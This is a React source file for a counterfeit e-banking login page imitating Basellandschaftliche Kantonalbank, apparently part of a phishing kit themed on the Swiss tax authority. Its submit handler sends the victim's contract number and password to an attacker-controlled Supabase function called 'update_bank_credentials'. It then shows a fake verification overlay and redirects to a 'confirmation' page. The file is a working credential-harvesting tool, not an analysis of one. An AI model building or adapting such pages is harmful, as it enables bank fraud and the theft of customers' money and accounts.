import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff } from "lucide-react";
import logoAsset from "@/assets/blkb-logo.svg.asset.json";

const RED = "#FD000D";
const LINK_RED = "#FD000D";
const HOVER_RED = "#ba0a12";

type FieldProps = {
  id: string;
  label: string;
  type?: "text" | "password";
  value: string;
  onChange: (v: string) => void;
  isPassword?: boolean;
  showPassword?: boolean;
  onTogglePassword?: () => void;
  errorMessage: string;
};

const FloatingField = ({
  id,
  label,
  type = "text",
  value,
  onChange,
  isPassword,
  showPassword,
  onTogglePassword,
  errorMessage,
}: FieldProps) => {
  const [focused, setFocused] = useState(false);
  const [touched, setTouched] = useState(false);
  const active = focused || value.length > 0;
  const inputType = isPassword ? (showPassword ? "text" : "password") : type;
  const hasError = touched && value.length === 0;
  const borderColor = hasError ? RED : focused ? "#1a1a1a" : "#bdbdbd";
  const labelColor = hasError ? RED : focused ? "#1a1a1a" : "#666";

  return (
    <div>
      <div className="relative">
        <input
          id={id}
          type={inputType}
          value={value}
          onChange={(e) => onChange(e.target.value)}
          onFocus={() => setFocused(true)}
          onBlur={() => {
            setFocused(false);
            setTouched(true);
          }}
          className="w-full h-14 px-4 pr-10 border bg-white text-[15px] text-black outline-none rounded-[2px] transition-colors"
          style={{ borderColor }}
        />
        <label
          htmlFor={id}
          className="absolute pointer-events-none transition-all px-1"
          style={{
            left: active ? 12 : 16,
            top: active ? 0 : "50%",
            transform: "translateY(-50%)",
            fontSize: active ? 12 : 15,
            color: labelColor,
            backgroundColor: "#ffffff",
          }}
        >
          {label}
          <span style={{ color: labelColor }}> *</span>
        </label>
        {isPassword && (
          <button
            type="button"
            onClick={onTogglePassword}
            aria-label="Passwort anzeigen"
            className="absolute right-3 top-1/2 -translate-y-1/2 text-[#444]"
          >
            {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
          </button>
        )}
      </div>
      {hasError && (
        <p className="mt-1 text-[13px]" style={{ color: RED }}>
          {errorMessage}
        </p>
      )}
    </div>
  );
};

const ChBasellandschaftlicheKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Basellandschaftliche Kantonalbank – E-Banking Login", logoAsset.url);

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer / Benutzername",
        p_password_label: "E-Banking Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/estv/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col" style={{ backgroundColor: "#fafafa" }}>
        {/* Header / Logo */}
        <header className="pt-10 md:pt-12 px-6 md:px-16" style={{ backgroundColor: "#fafafa" }}>
          <img src={logoAsset.url} alt="BLKB" className="h-6 md:h-7" />
        </header>

        {/* Main Card */}
        <main className="flex-1 flex flex-col items-center px-4 md:px-6" style={{ backgroundColor: "#fafafa" }}>
          <div className="w-full max-w-[580px] mt-16 md:mt-10 bg-white shadow-[0_0_20px_rgba(0,0,0,0.12)] rounded-sm p-6 md:p-12">
            <h1 className="text-[22px] md:text-[24px] font-bold text-black mb-8">
              Login E-Banking
            </h1>

            <div className="space-y-6">
              <FloatingField
                id="blkb-user"
                label="Vertragsnummer / Benutzername"
                value={vertragsnummer}
                onChange={setVertragsnummer}
                errorMessage="Bitte geben Sie Ihre Vertragsnummer ein."
              />
              <FloatingField
                id="blkb-pass"
                label="E-Banking Passwort"
                isPassword
                value={passwort}
                onChange={setPasswort}
                showPassword={showPassword}
                onTogglePassword={() => setShowPassword(!showPassword)}
                errorMessage="Bitte geben Sie ihr Passwort ein."
              />
            </div>

            <div className="flex justify-end mt-8">
              <button
                onClick={handleSubmit}
                className="bg-[#1a1a1a] hover:bg-[#ba0a12] text-white px-10 py-3 rounded-[2px] font-bold text-[15px] transition-colors"
              >
                Weiter
              </button>
            </div>

            <div className="mt-10">
              <h2 className="font-bold text-[15px] mb-3 text-black">
                Haben Sie noch kein E-Banking?
              </h2>
              <div className="flex flex-col gap-2">
                <a
                  href="https://www.blkb.ch/privatpersonen/e-banking/e-banking-blkb.html"
                  className="font-bold text-[15px] hover:underline"
                  style={{ color: LINK_RED }}
                >
                  E-Banking bestellen
                </a>
                <a
                  href="https://ebanking-demo.blkb.ch/wb/ui/uebersicht"
                  className="font-bold text-[15px] hover:underline"
                  style={{ color: LINK_RED }}
                >
                  E-Banking testen (Demoversion)
                </a>
              </div>
            </div>
          </div>
        </main>

        {/* Footer */}
        <footer className="mt-12" style={{ backgroundColor: "#f7f8fa" }}>
          <div className="px-6 md:px-16 py-4 flex flex-col items-end gap-2 text-[14px]">
            <a href="#" className="hover:font-bold no-underline" style={{ color: LINK_RED }}>
              Hilfe und Kontakt
            </a>
            <a href="#" className="hover:font-bold no-underline" style={{ color: LINK_RED }}>
              Schützen Sie sich vor Betrügern
            </a>
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChBasellandschaftlicheKantonalbank;
